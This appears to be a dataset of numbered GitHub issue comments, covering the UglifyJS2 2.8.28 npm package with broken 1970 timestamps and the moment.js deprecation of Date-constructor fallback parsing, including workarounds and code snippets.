-rw-rw-rw-  0 0      0        6938  1 Jan  1970 package/lib/transform.js
-rw-rw-rw-  0 0      0        3644  1 Jan  1970 package/lib/sourcemap.js
-rw-rw-rw-  0 0      0       23483  1 Jan  1970 package/lib/scope.js
-rw-rw-rw-  0 0      0        8895  1 Jan  1970 package/lib/propmangle.js
-rw-rw-rw-  0 0      0       57351  1 Jan  1970 package/lib/parse.js
-rw-rw-rw-  0 0      0       47999  1 Jan  1970 package/lib/output.js
-rw-rw-rw-  0 0      0       22265  1 Jan  1970 package/lib/mozilla-ast.js
-rw-rw-rw-  0 0      0      179487  1 Jan  1970 package/lib/compress.js
-rw-rw-rw-  0 0      0       34888  1 Jan  1970 package/lib/ast.js
-rw-rw-rw-  0 0      0       10194  1 Jan  1970 package/tools/node.js
-rw-rw-rw-  0 0      0         688  1 Jan  1970 package/tools/exports.js
100  126k  100  126k    0     0   232k      0 --:--:-- --:--:-- --:--:--  232k

-rw-rw-rw-  0 0      0        1640  1 Jan  1970 package/tools/props.html
```

Note that this is **not** a problem in `2.8.27`:

```
$ curl https://registry.npmjs.org/uglify-js/-/uglify-js-2.8.27.tgz | tar -tvf -
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0-rw-rw-rw-  0 0      0        1139 19 May 19:53 package/package.json
-rw-rw-rw-  0 0      0       41915 19 May 19:53 package/README.md
-rw-rw-rw-  0 0      0        1348 15 Jan 21:32 package/LICENSE
-rw-rw-rw-  0 0      0        1982 19 May 19:53 package/bin/extract-props.js
-rw-rw-rw-  0 0      0       21426 19 May 19:53 package/bin/uglifyjs
-rw-rw-rw-  0 0      0       34888 19 May 19:53 package/lib/ast.js
-rw-rw-rw-  0 0      0      179487 19 May 19:53 package/lib/compress.js
-rw-rw-rw-  0 0      0       22265 19 May 19:53 package/lib/mozilla-ast.js
-rw-rw-rw-  0 0      0       47845 19 May 19:53 package/lib/output.js
-rw-rw-rw-  0 0      0       57351 19 May 19:53 package/lib/parse.js
-rw-rw-rw-  0 0      0        8895 19 May 19:53 package/lib/propmangle.js
-rw-rw-rw-  0 0      0       23483 19 May 19:53 package/lib/scope.js
-rw-rw-rw-  0 0      0        3644 22 Mar 22:18 package/lib/sourcemap.js
100  127k  100  127k    0     0   132k      0 --:--:-- --:--:-- --:--:--  132k

-rw-rw-rw-  0 0      0       11096 19 May 19:53 package/lib/utils.js
-rw-rw-rw-  0 0      0         688 19 May 19:53 package/tools/exports.js
-rw-rw-rw-  0 0      0       10194 19 May 19:53 package/tools/node.js
-rw-rw-rw-  0 0      0      142838 19 May 19:53 package/tools/domprops.json
-rw-rw-rw-  0 0      0        1640 15 Jan 21:32 package/tools/props.html
```

_Edit_: Related to https://github.com/mishoo/UglifyJS2/issues/2054 

_Edit 2_: here's an incomplete list of other issues that appear to have a root cause as outlined above:

- https://github.com/aws/aws-cli/issues/2639
- https://discuss.circleci.com/t/zip-does-not-support-timestamps-before-1980/13110
- https://github.com/Shippable/support/issues/3634
- https://github.com/aws/aws-cli/pull/2646
- https://github.com/webpack/webpack/issues/5022

---

@alexlamsl @kzc Is there anything else I can do to help? I understand your time is valuable, so I might be able to help debug some more if required?"
3817	"If you're using Babel, you can try switching to using Babili minifier:
https://github.com/babel/babili
since it's clear this issue isn't going anywhere.

I highly recommend it, there's even a webpack plugin!"
3818	"A thread so frustrating it made it to Hacker News. 

https://news.ycombinator.com/item?id=14541021"
3819	i have the same issue that cost me a serious amount of time because this package is way down our dependency chain in the build process. please publish a fix or at least reopen the issue so people can find and help each other! This issue being closed was a hurdle by itself. We currently cannot release new builds doe to this problem.
3820	"(_in response to a deleted comment_)
Forking doesn't solve all your problems. A friend recommended [butternut](https://github.com/Rich-Harris/butternut), which claims to run 3 times faster than UglifyJS.

And you know you've got a problem when a _Pythoner_ is having problems with your _JavaScript_ package. That ""dependency chain"" must be large..."
3821	If you don't provide even this tiny amount of effort to support your users then I hope you don't tout this project as a reason people should hire you. Supporting users, in some sense, is at least some small part of nearly every engineers job, and given how vanishingly small the effort required on your part to fix this problem is, your obstinate refusal to lift a finger really reflects badly on your ability and willingness to cooperate.
3822	"For anyone in need of a workaround, I was able to avoid this issue by installing uglifyJS 2.8.27 as an exact version (no `~` or `^`) at the top level of our dependency tree and shrinkwrapping, even though it is not used directly in our top level repo.

Then, the sub dependencies that actually require uglify were able to use the version I had installed (2.2.27) and did not attempt to install the latest (2.2.28) which causes problems in CircleCI. I'm unsure how exactly NPM determines whether it's ok to reuse an existing version for sub dependencies or install the latest available, but this worked for us. It may not work with Yarn though, untested.

It's a hack, but the author looks like they're just not going to fix this and we could not wait."
3823	"> And you know you've got a problem when a Pythoner is having problems with your JavaScript package. That ""dependency chain"" must be large...

I looked at a recent rails project, gem included: [uglifier](https://github.com/lautis/uglifier) - A ruby wrapper for UglifyJS. Luckily that project depends on an earlier version of this package but it shows how long those dependency chains can be."
3824	"A bystander watching the whole conversation. Why not workaround the mtimes in a Dockerfile and move on? Not sure demanding a fix from an open-source developer is the way to go, despite the original reply or what reddit told you to do.

```
stat -f %c package.json | xargs -I{} date -j -f %s {} +%y%m%d%H%M | xargs -I[] find . -type f -exec touch -am [] {} \;
```"
3825	As a consumer and maintainer of opensource software (https://github.com/i18next/i18next) i can understand both sides. Both sides work equal hard to get their work done. Both sides are equal right and wrong. Personally i would just go the way and bump the version and put that patch out even knowing that i patch the issues of other tools out there. Reason...i could do it. Putting an end to this - while i can't solve the issues in the other projects. Just take a step back. Breath. Get over it. All people would be thankful.
3826	">Publishing a new patch version that solves this issue for everyone out there would take such little time. 

Republishing wouldn't have helped, because they'd be using the same set of broken tools and would just upload another dodgy tarball for you all to have mtime issues with.

But [behold](https://github.com/mishoo/UglifyJS2/issues/2065#issuecomment-308031804).

Now that @gabor has put some actual effort in (instead of choosing the popular alternative of crying his eyes out in this thread) the UglifyJS2 developers know what the actual problem is and can avoid using that version of npm on Windows the next time they release a version.

In the meantime, just `touch` all your files."
3827	Ah, I owe the UglifyJS2 developers an apology then, if this was in fact the cause of the problem. Windows strikes again, I guess.
3828	That makes things a little different, if the corruption is indeed unavoidable on windows using that version of the tool, they would only be able to fix it by switching OSes.
3829	"At the very least most of this thread (including infamy on other sites) could have been avoided (or at least reduced) if the issue hadn't been closed despite numerous confirmations. 

That contributed to the frustration more so than anything IMO. I started out quite civil and only became frustrated / hostile when the author(s) refused to give gravity to the situation that I knew was breaking builds across the planet. "
3830	Regardless of whether who's right or wrong, or what the actual problem is, what's the technical debt in pushing a release even if it is just pushing the same tag with a new version? It's already been QA'd I'd assume and the only change would be the updated file metadata. This project seems to release regularly anyway (I'm not a web developer but this issue has gotten a lot of attention), so why not just bite the bullet?
3831	"I will offer my apology regarding assuming this wasn't an npm issue and for any hostility shown previously.

However, I stand by my affirmation that this should have been handled more professionally (by everyone), including keeping the issue open while people tracked down the root cause.

Edit: side note - I wouldn't have been able to create any kind of helpful issue on npm as I have no idea what the author's build environment and/or npm/node versions were/are at the time of publish.  The author should have created the ticket with npm saying ""this is my environment and this is what happened."""
3832	"My two cents here:

It's important for maintainers of open-source projects to accept bugs as valid, *even if they are not directly caused by their own code*. Given that the maintainers are the only people who are intimately familiar with the codebase and all of its dependencies, they are also the only people who are in a good position to report bugs upstream and track them, essentially acting as a middleman towards their users.

This is also why issues should only be closed if there's clear evidence that they're invalid, not just ""looks like not our problem"". If there's doubt about whether it's user error or a bug in the maintainer's stack, then it's the job of the maintainer to ask the right questions to assess that (and prepare issue templates, and so on). The user can't know what information you need, until you ask.

Put more succinctly: __the user doesn't care whether it's the fault of the maintainer or not.__ They also shouldn't *need* to care, for open-source software to be sustainable and competitive in the long run.

That having been said, there's a big difference between informing a maintainer that it's their job to handle bug reports, and personally accusing them of being responsible for your woes. Especially when you're a developer (read: a professional), you're expected to have the infrastructure in place to deal with upstream issues when they inevitably occur.

While it is the maintainer's responsibility to pick up the bug and trace where it originates from, __they are not responsible for your loss of work time, unless you have a support contract with an SLA.__

In the end, nothing is accomplished by pointing blame back and forth. Let's just each take our part of the responsibility - maintainers are responsible for tracking down bugs and getting them fixed regardless of where in the stack they occur, and developers (""users"") are responsible for having their own contingency plans when things do eventually break, despite best efforts of all parties."
3833	@joepie91 all excellent points. I would add though that, while I can only speak for myself, my expectation isn't that the uglifyjs maintainers should fix this _for me_. Yes it cost me some time to troubleshoot and then fix myself, but I committed a fix to our codebase shortly after my first comment in this issue thread. I agree with you that this is my responsibility. What concerns me are the countless people who have run into this issue but haven't spoken up, or who are yet to encounter it. Particularly now that the problem has been identified and the solution is clear (push out a bumped version with either node 6.x or 8.1.0), it still bothers me that there is no will to fix this [before the next backport release](https://github.com/mishoo/UglifyJS2/issues/2065#issuecomment-308079819).
3834	"Very good points @joepie91 .

I would agree with @fdintino that waiting until the next backport release to address this problem is definitely downplaying the severity of this issue.  It's almost always brought in as a transitive dependency so for someone starting a new project who hasn't yet encountered this issue they are most certainly going to encounter this bug.  This will continue to consume a lot of development hours across many companies until 2.8.29+ is released.

I agree with using open source is always ""at your risk"" but this is an incredibly important issue that **still remains closed** when it's been confirmed to be an issue with the author's publish environment (even if not caused by the author).

Closed means non-issue, can't reproduce, or some other status of ""not something we can or will address.""  This issue falls under none of those categories."
3835	Just to recap and to get a more clear vision of how we can proceed. The issue will not be fixed, although the problem is identified. At least until the next backport release? Is there any vague time frame when this happens? I am asking because we have no easy way to fix the current corrupted package by ourself in our current build chain. Any of the current workarounds flying around here are not really applicable in the way our build process works currently. So the only way to get our system running again is removing dependencies that pulled in UglifyJS2 and try to write the functionality ourself? I would be glad to get a statement about this so we can make an informed decision and work out a solution plan and start taking action to get our system back to life. 
3836	@pythoneer if you `npm install --save uglify-js@2.8.27` and you are using npm >= 3.x then it will satisfy all intermediate dependencies that have `'uglify-js': '~2.8.x'` or `'uglify-js': '^2.8.x'` in their package.json. And as a proactive measure you can use npm shrinkwrap or yarn to recursively freeze all dependencies, to guard against future backwards-breaking changes in other packages.
3837	"@alexlamsl

When there's a complaint about a specific package version like this, please consider either using one of the many npm API tools to directly download the package and verify it, or using `npm pack` to verify the packaging behavior yourself. Either would have let you confirm the issue relatively quickly and could have prevented a lot of this chatter. Closing it and leaving it closed was not appropriate, as the issue still exists in a published package version that you've left as the latest in that version range. Even if the root of the problem is upstream, that doesn't resolve the current problem users have with the published version.

> One thing I can add is uglify-js 3.0.15 was published with npm that was bundled with node 7.10.0, whereas IIRC uglify-js 2.8.28 was done with node 8.0.0 - so you may add that to your issue report for them.

I understand that the root cause of this issue wasn't in uglify-js. But the tools you use when you build packages is still your responsibility. If you're using a tool (or a version of that tool) that produces incorrect output, the expectation is that you recall the release and/or you downgrade your tools until that issue is fixed - not that you leave everyone in limbo until upstream figures out what _your_ problem is and fixes it for you. If you're going to wait on upstream, unpublishing or [retagging](https://stackoverflow.com/questions/14949886/how-can-i-remove-a-tag-from-npm) the offending build should be a strong suggestion. Just letting people sit with broken builds isn't your only option. And it shouldn't be an option at all. Especially on a maintenance branch like this.

Many developers (myself included) like to use the latest versions of their tools and software, and that's understandable. But sometimes this can introduce bugs. I'd like to suggest that you set up a free account with https://travis-ci.org/. You can do automated builds on there and set it up to publish directly from there, so the setup on your local machine won't matter at that point. If your personal setup is going to change frequently, it makes sense to use a more static configuration that's not as fragile.

Good luck in dealing with the remaining pieces of the issue."
3838	"Obligatory XKCD:

<img src=""https://imgs.xkcd.com/comics/bug.png"">"
3839	"Is it a matter of pride that the issue is still closed?  I've already implemented fixes in our build processes and told the company wide to lock any new package.json entries to version 2.8.27.  That doesn't mean that a new point release shouldn't be published immediately.

Yes, it is a small inconvenience in terms of individual persons or projects, but you should consider the collective time spent across all people dealing with this issue, including the numerous other projects having reported issues that lead back to this issue (that leads back to the **fixed** npm issue).

@alexlamsl please, at least reopen this issue, and mark it fixed when you have time to update node/npm and republish.  This is going to continue to break builds until a fix is implemented.  Put at least a little consideration into the time of all the people who will ultimately see this issue pop up."
3840	"@eric-tucker I'm glad that you were able to fix your build process, but I don't think it's a productive use of your time to continue repeating your opinions here. I'm pretty certain you've made your beliefs crystal clear. I think that everyone on both sides of this have had ample opportunity to express their opinions, and many valid points were made from both sides. At this point, the only logical thing to do is to sit back and see what the maintainers do. I do not believe that continuing to berate them will offer much incentive for them to grant your wishes.

And always remember people:
![It's free software!](https://i.warosu.org/data/g/img/0476/01/1429486705097.gif)"
3841	"If people had put as much effort into being helpful as into writing meme comments, this would have been fixed a week ago.

I never actually had this problem, but the response of the maintainers and community is making me think that I am unsafe to depend on this tool."
3842	![](https://i.imgflip.com/1qw22e.jpg)
3843	Time to move to Clojure Compiler, this debacle is embarrassing.
3844	@schwitzerm A fixed release was pushed out to npm, 2.8.29. I really appreciate it @alexlamsl. I don't benefit from it personally, but I'm glad this won't cause issues going forward for fellow developers. You have gotten a lot of grief (some, admittedly, from me). And you aren't likely to be thanked by any of the people who would have been frustrated by the node bug that crept into the 2.8.28 build but now will not, because people only notice when things break. The same goes for all of the other bug fixes you continue to push out for the 2.x backport branch and the features being added to 3.x. I would imagine, particularly after this episode, that this can sometimes be a thankless job. So I'd like to personally express my gratitude for your work.
3845	![](https://media1.giphy.com/media/BQAk13taTaKYw/giphy.gif)
3846	@alexlamsl this is honestly the most brutal silent treatment from a maintainer of a popular repo I've seen till now.
3847	"With the amount of pisspoor attitude from most people in this thread, can you blame them? Also, this was never a problem caused by this project, it was always third party tools that couldn't handle timestamps properly, and the only reason it was found out was because of a bug in yet another tool. None of this was caused because of UglifyJS.

However, they already **have** released a fixed version. https://github.com/mishoo/UglifyJS2/releases/tag/v2.8.29

So why are you still harping on on this obsolete and outdated issue that doesn't mean anything to anyone anymore?"
3848	"+1. I totally agree. We should start issuing a deprecation warning right away. Some additional support:
- That a string might go into the Date constructor or the ISO parser is ugly and confusing
- The most reliable way of using the Date string constructor was always `new Date('2014-01-01')`, which is now handled by the ISO parser anyway (i.e. `moment('2014-01-01')` doesn't use the Date constructor anyway).
- I'm pretty sure the constructor works differently in different locales for the same browser. E.g. `new Date(""05/06/2014"")` is May 6 in American browsers but June 5 in English browsers. So even if you test all your browsers, did you test all your locales? It's terrible for us to even pretend this stuff works.
- If you _really_ want to use the date constructor, you can always just use the date constructor and pass the date into Moment.
- We could make `moment(string)` extensible, and then someone could create a plugin that either uses a list of well-known formats or just the Date constructor to parse them.
- If we remove the Date constructor fall-back, we can actually make the ISO parser less strict, since it won't be preempting a better parse. So that's a win too.
"
3849	"The idea I liked most is for extensible constructor -- even if we disable Date parsing in moment, we should make it easy for people to migrate.

So lets do this:

``` javascript
moment.createFromInputFallback = function(config) { config._d = new Date(config._i); };
```

And call this method in the `else` clause of `makeDateFromInput`. In 3.0 we'll just remove this function, or place it under another name, so that one can just assign to the preset.

For tests right now, we can put a different function that throws an exception if called. I hope that would work just fine.

Inside we can print using console.warn (would go to stderr in node), only the first time it is called (like global deprecation) -- this is to let users know what awaits them.
"
3850	"I don't understand this deprecation warning. I am using moment.js as documented, in an Angular.JS filter:

``` javascript
app.filter('scanDate', function() {
    return function(input) {
        var m = moment(input);
        return m.format(""dddd, MMMM Do YYYY"");
    };
});
```

Where `input` is an ISO formatted date string.

What do I need to do different to deal with this future deprecation?

If this deprecation warning is for the developers of this library and not for the users of it then I am going to suggest to remove it.
"
3851	"@st3fan Are you sure it's an ISO-formatted string? Moment is claiming that it isn't; it's saying that it can't parse it, and it is instead resorting to passing the string to `new Date(s)`, which happens to work. That's the feature we're removing and are warning you about. In the future, it will fail. Your options are:
1. Ensure that the input really is ISO-8601 compliant (and file a bug if you think it is but are getting the warning anyway)
2. Parse the input explicitly using `moment(input, string)`

The warning is very much for you :)
"
3852	"This is implemented, so I'm closing it.
"
3853	"If we deprecate everything in Javascript that doesn't work on a side-case there will be no features left. ;) Looking forward to at least a few other ""sane"" date formats being added back in. Explicitly creating a Date or including the format string removes a lot of Moment's elegance.
"
3854	"@Meekohi We'll always allow ISO strings like '2013-05-10', which IMO everyone should just use. As for other strings, '05/10/2013' works differently in different locales, and most of the rest don't work across browsers. These aren't really side-cases; we receive an awful lot of support tickets here about surprises from things like `moment(""1.10.2014"")` where the user is expecting us to parse it consistently.

We are allowing this to be pluggable, so you can override the fallback parser (i.e. the thing currently giving a deprecation warning and then using the native parser) to do anything you'd like, and I suspect there will be some plugins built that do just that.
"
3855	"@icambron Is the correct way to plugin your own parser to overwrite `createFromInputFallback`? i.e.

``` javascript
moment.createFromInputFallback = function(config) {
  // unreliable string magic, or
  config._d = new Date(config._i);
};
```
"
3856	"@Meekohi Correct.
"
3857	"hi guys,
i'm use moment on my node apps.
i using it something like this one

```
moment(Date('2014-04-21T05:29:59Z')).format(""DD-MM-YYYY"")
```

now when i check log on my server, i get error message on my log files

```
Deprecation warning: moment construction falls back to js Date. This is discouraged and will be removed in upcoming major release. Please refer to https://github.com/moment/moment/issues/1407 for more info.
```
"
3858	"@aredo I think you're expecting `Date(string)` to return a `Date`? It appears to return a string. I think you want `moment(new Date(string))` or `moment(Date.parse(string))`, or even just `moment('2014-04-21T05:29:59Z')`
"
3859	"I'm using an iso 8601 format like this: 2014-04-29 17:47:12, is there a list of the supported formats that will not be deprecated?
"
3860	"(Editing because I misunderstood the question and this is kind of an important doc now). @godoploid Only ISO 8601 are asp.net-JSON-style dates are not deprecated. On your specific format, that isn't ISO-compliant. Use a ""T"" instead of a space, as in ""2014-04-29T17:47:12"" (see [here](http://en.wikipedia.org/wiki/ISO_8601#Combined_date_and_time_representations)).
"
3861	"@icambron Got it thanks, I'll make sure to do so!
"
3862	"@icambron 
But how I format the current time?

When i try this `var now = moment().format('YYYY-M-D')`, it warning me: `moment construction falls back to js Date. This is discouraged and will be removed in upcoming major release. Please refer to https://github.com/moment/moment/issues/1407 for more info.`
"
3863	"@imsobear I'm not sure the error message you see is from `moment().format('YYYY-M-D')`, I think its something before that.
"
3864	"The documentation have a example that throws this Deprecation message.

Yeah I know, there is ""warning"" text, but if is for remove, maybe some ""Deprecation"" in the docs, could help the newbies.

```
moment(""Dec 25, 1995"")  -> ""moment construction falls...""
```

http://momentjs.com/docs/#/parsing/string/
"
3865	"Hello nice folks.  I came here via the deprecation link and am totally fine with having moment not try to parse garbage.  I found this while writing a test to make my code check for `.isValid()`.

What is the recommended way of disabling this warning?
"
3866	"Ugh. Postgresql native date types are no longer supported because of this?
"
3867	"@matthew-dean  && @elliotf ,

```
moment.createFromInputFallback = function(config) {
  // unreliable string magic, or
  config._d = new Date(config._i);
}; 
```

via [@Meekohi's](https://github.com/moment/moment/issues/1407#issuecomment-41620885) comment is how to put the old behavior back in for now.
"
3868	"@matthew-dean can you please be more specific? What date format do you want parsed? Also if you know that this comes from postgresql I'd really suggest writing a proper format and using it when you want to parse it. This approach is far superior, and this is why we're deprecating the Date fallback in the first place.
"
3869	"Sorry, forgot to update this. Bad form. It was neither Moment nor Postgresql date formats, but the incorrectly-written gist (of someone else) I was basing some code on that used the two.
"
3870	"Sorry if I have miss understood something here but I just want to be clear on how isValid() is working.

Current version <code>moment('2014 05 12').isValid() // true + warning message</code>
Next major version <code>moment('2014 05 12').isValid() // false + no warning message</code>

This correct?
"
3871	"@skinnybrit51 Correct
"
3872	"So now moment throws a warning when it tries to parse its own created dates if they're saved to a string?

localStorageService.set('now', moment());
var now = localStorageService.get('now');
moment(now).isValid(); // <-- false? (e.g. ""2014-07-22T16:33:18.097Z"")

Any ideas?
"
3873	"@jough That's a good point; we ought to be able to parse our own `toString` format. @ichernev what do you think? We could make `toString()` just ISO or we could support the format explicitly.
"
3874	"We use Date's toString, we should be able to parse that. Its an rfc I linked in the parsing issue #1686
"
3875	"What about number as string? Shouldn't it be parsed as milliseconds?
"
3876	"@tsouza if you know its a number why don't you convert it first. Storing a numeric timestamp in string doesn't look like something we want to encourage. Just do `moment(+string_containing_number)`.
"
3877	"Well, what about if I don't know if it's a number? One great feature of momentjs is that it can convert anything that is convertable to a date.
"
3878	"I'm getting this deprecation notice too, but I'm _never_ providing a date without an accompanying format string. If it's that the supplied date string doesn't match the format, I would expect a different error, no?
"
3879	"@Synchro correct, you should never get that message if you always include a format string. Can you provide a reproduceable example?
"
3880	"I get this error in [our production app](http://stockbase.com) but without a line number, it's very hard to pinpoint what exactly generates the error. We use the [live-timestamp](https://atmospherejs.com/package/livestamp) Meteor package, so maybe that's the culprit, but who knows? Or maybe there's no incorrect usage of non-ISO date formats.

Can moment please complain about _specific instances_ of this deprecated usage?
"
3881	"If you can reproduce the message on your development / testing environment, you can use something like this to temporarily transform console.warn and get the stacktrace of the message : 
`console.warn = console.trace.bind(console);`
"
3882	"Thanks @Y-- - turns out that the [livestamp js library](https://github.com/mattbradley/livestampjs/issues/25) has this issue.
"
3883	"@ichernev: shouldn't there be a deprecation warning in the docs at http://momentjs.com/docs/#/parsing/string/?
"
3884	"I agree with @dandv , this should include a file/line number message such as this deprecation warning from express.js:

```
express deprecated res.json(status, obj): Use res.status(status).json(obj) instead api/controllers/view-controller.js:77:20

```

In very large complex projects it's hellacious to find where this is coming from otherwise.
"
3885	"@dandv we need to put something there. The problem is we haven't yet figured out how to make the new api in a way that will break the least amount of users, is more flexible and still lets you do the old stuff. The current proposal is: https://github.com/moment/moment/issues/1686

@WhatFreshHellIsThis we need some call stack hacks to figure that out. It won't work on some restricted environments (browser plugins), so I'm not very excited. I'd merge a PR if it looks solid (shouldn't crash in any case), and is not a lot of code. It might need to traverse the stack until it finds the first non-moment code -- in minified code that is not possible (one issue OTOH).
"
3886	"So why parsing of `""Thu Apr 24 2014 12:32:21 GMT-0700 (PDT)""` is deprecated? I would love that formats which are non ambiguous are still automatically parsed. Those which are (day/month/year vs. month/day/year) are understandable to have issues and one might not want to parse it automatically (but there could be on option about preference). I am using Moment to parse dates which I get in various formats from external sources and I do not know which all formats they will be in. For non ambiguous formats I would love to get them parsed automatically. For ambiguous formats I should tell which one I prefer. For garbage it should throw an error or something.
"
3887	":+1: to what @mitar just said
"
3888	"@mitar The problem is that that's not actually how Moment works. When it's parsing a string like `""Thu Apr 24 2014 12:32:21 GMT-0700 (PDT)""`, it is just passing that string to the `Date` constructor and using the date that comes out. There are some formats that work on all browsers, some that work on some browsers but not others, and of course many perfectly unambiguous ones that work on no browsers. Moment doesn't know the difference between those formats. The Moment interface doesn't do a good job of making that clear and that leads to a lot of confusion about what will work where, so we've deprecated it.

See #1686 for the explicit API we plan to implement to make this both clear and convenient. And you can always do `moment(new Date(whatever))` if you're confident the string is parsable by the constructor; that's all Moment was doing for non-ISO strings anyway.
"
3889	"OK, but then I must say that I was completely misusing the Moment for all this years. The main reason for me why I was using Moment was because I believed it does a better job than `Date`. I thought that the main purpose of Moment is to parse such dates. That it tries various formats and that it knows how to parse more than what `Date` was parsing. Are you sure this was not a feature in the past?
"
3890	"@mitar It tries ISO-8601 explicitly, and if that fails, it falls back on the date constructor. As far as I know, that's always been how it works, and we've long encouraged users to use explicit parsing strings where possible. So your confusion is exactly what we're aiming to fix with this deprecation :)
"
3891	"In reference to what @mitar said above, it would be very nice if `moment(moment().toString())` was supported.  I'm not sure if this means parsing the JS date format, or changing the `toString()` of moment, but it would be nice.  :)
"
3892	"Well... I suppose `moment(moment().toISOString())` isn't a terrible compromise...
"
3893	"@jwalton I generally agree (see my comments higher up in this ticket). We could try the `toString` format explicitly. If we left the end open, that should also work for `new Date().toString()`  (i.e. the string used by @mitar). The native date `toString()` format is actually not defined by [the spec](http://www.ecma-international.org/ecma-262/5.1/#sec-15.9.5.2) but it will mostly OK in practice if we ignore the TZ abbreviation at the end. It's a bit more complicated than that because of localization, but it's likely that something could be made to work.
"
3894	"Hi, I use the following node.js code to query a MongoDB database for two documents. One at the start of day (time lies in the first 10 seconds of the day) and a second document at the end of the day (time lies in the last 10 seconds of the day). The code works ok but I get a deprecated warning.
The code is:
var query = { $or: [ { date: new RegExp(moment(date).format(""YYYY-MM-DDT00:00:0"")) }, { date: new RegExp(moment(date).format(""YYYY-MM-DDT23:59:0"")) } ] };
Where date is a string containing ""2014-9-30"".

The result is a query object containing:
{ '$or':
   [ { date: /2014-09-30T00:00:0/ },
     { date: /2014-09-30T23:59:0/ } ] }

How would the new syntax look like?

Thanks,
Jacco 
"
3895	"How can I find what line of code is causing the warring message to be thrown? (sorry if noob question). I'm using Firebug to see and try to debug my code.  I believe its being thrown by one of the 3rd party plugins that relies on moment that i'm using, but can't seem to narrow it down (too hard to disable all but 1 plugin).
Thanks,
"
3896	"@marc-gist You could try setting a breakpoint in Firebug in [the function that logs deprecation warnings](https://github.com/moment/moment/blob/6f6f7cf61e97d05b7c48f60870983f6f5ce8e8df/moment.js#L328) and then look at the call stack.
"
3897	"I don't understand why this issue is closed? The problem is neither solved, nor I found anything in the documentation about this problem. Just a console.log with a warning and only for the first execution.

BTW: is there a release date for moment 3?

There should be a note in the docs: http://momentjs.com/docs/#/parsing/utc/ and http://momentjs.com/timezone/docs/#/using-timezones/parsing-in-zone/ what to avoid, for instance, pass a formatter for non ISO pattern.
"
3898	"These are valid ISO8601 dates that give a deprecated warning:

```
YYYY    : moment('2014') // year
YYYY-MM : moment('2014-10') // year, month
YYYYMMDD: moment('20141023') // hyphens are supposed to be optional
HHMMSS  : moment('2014-10-23T071823') // colons are supposed to be optional
```

This incorrectly returns false:

```
moment('2014-10-23', moment.ISO_8601, true).isValid() // if you add a ""T"" after the day, it returns true
```

These work correctly:

```
moment('2014-10-23') // date

// just hour
moment('2014-10-23T07') // date, hour
moment('2014-10-23T07+01:00') // date, hour, utc offset
moment('2014-10-23T07Z') // date, hour, 0 utc offset shortcut

// just hour, minutes
moment('2014-10-23T07:59') // date, hour, minute
moment('2014-10-23T07:59+01:00') // date, hour, minute, utc offset

// hour, minutes, seconds
moment('2014-10-23T07:59:58') // date, hour, minute, seconds
moment('2014-10-23T07:59:58+01:00') // date, hour, minute, seconds, utc offset

// hour, minutes, seconds, hundredth of a second
moment('2014-10-23T07:59:58.99') // date, hour, minute, seconds, seconds decimal
moment('2014-10-23T07:59:58.99+01:00') // date, hour, minute, seconds, seconds decimal, utc offset
```

With regards to colons in times being optional, [wikipedia](https://en.wikipedia.org/wiki/ISO_8601#Times):

> The basic format is [hh][mm][ss]...so a time might appear as either ""134730"" in the basic format or ""13:47:30"" in the extended format.
"
3899	"The documentation makes no mention of this deprecation – it still merrily tells you to construct with a String and such.
"
3900	"+1
"
3901	"This change basically replaces (a) `moment(str, moment.ISO_8601);` with `moment(str)` and (b) `moment(str)` with `moment(new Date(str))`.

Wouldn't it be easier for everybody to change (a) to `moment(str,'iso')` or `moment(str,true)`, and get reliable ISO parsing with less typing, without breaking lots of existing software and adding extra typing for people who need (b)?
"
3902	"Is there any way I can get `isValid()` to return `FALSE` in v2.8.3 i.e. get this functionality before the next release?
"
3903	"This is really crappy now. Honestly, the entire point of using moment is so that I don't have to think about date formats; with moment they should just work. This deprecation makes me not want to use the library at all, because now I have to think about date formats again and wrap custom (read: hacky) code around my moment instantiations, to do its job for it. A better solution would be to put in more regexes for common date formats that make sense or are obvious. Example: you'll parse ""2014-04-29T17:47:12"" with a T, but not ""2014-04-29 17:47:12"" with a space? Seriously?
"
3904	"@soapergem +1
"
3905	"@soapergem is right. Does Moment want to be once again delightful to use, or not?
"
3906	"I would like to see this issue re-opened, because it seems there's a lot of people still discussing it.

If it's not moment's job to parse random date formats in a browser-compatible manner, what library do I use instead? [Datejs](http://www.datejs.com/)? :3
"
3907	"I'm using Moment on Node.js, and I would like the deprecation warning to be removed.

I use Moment to parse user input to get a date, and I don't really care if because of a non-standard string I get a weird result. Next time the user will change his/her input.
In addition to this, on Node.js it should be possible to have less uncertainty on the behaviour as it's not like dealing with dozens of different browsers.
"
3908	"The answer here is pretty clear: someone needs to put together the 50 or so parsing regex's into a lib, that moment could even end up implementing. It seems like a lot of people were mis-using moment, thinking it does more in that department than Date(), which only strengthens the decision to deprecate it (regardless if it was useful for a subset of people). 
"
3909	"Can we at least create a moment().unreliable() constructor or anything like that? For some people it doesn't matter if it's not 100% reliable!
"
3910	"I hate to repost this directly, but there is an extremely easy solution for this already posted in this thread:

``` javascript
moment.createFromInputFallback = function(config) {
  // your favorite unreliable string magic, or
  config._d = new Date(config._i);
};
```

If you have a well defined specific string format you want supported then create a new issue proposing it be supported. If you want to use the `Date` constructor specifically then do the above.
"
3911	"That is not exactly what I was asking, however. I like the current behaviour, where supported strings are parsed internally and Date() is used for the rest. I don't want to feed everything to Date() either.
"
3912	"@EgoAleSum - as the name `createFromInputFallback` indicates, `moment` first checks for an ISO string and will parse it internally, then passes it to the `createFromInputFallback` function.
"
3913	"I see, thanks
"
3914	"I quite understand moment wanting to avoid being responsible for parsing some random junk format, but my objection to the noisiness of this deprecation is that it also rejects date instances (not strings) created by moment, and date strings that provide an explicit, unambiguous format string (i.e. when no fallback is involved), when the docs say that that is the correct approach.
"
3915	"Actually the black magic parsing is what's most appreciable about moment. I understand the maintainer's logic though... It would be nice if that cruft was moved somewhere else as removing functionality is just not desirable.

Maybe move it to moment-guess, o have a moment.guess() function?
"
3916	"I just wrapped the date inside `new Date` and then converted to iso string so: 

`<%= moment(blog_feed[i].publishedDate).format(""DD MMM, YYYY"") %>`

Coverted to:

`<%- moment(new Date(blog_feed[i].publishedDate).toISOString()).format(""DD MMM, YYYY"") %>`
"
3917	"Here's a potentially helpful link I haven't seen in any of the issues in this repo:
http://dygraphs.com/date-formats.html ([context](http://blog.dygraphs.com/2012/03/javascript-and-dates-what-mess.html))

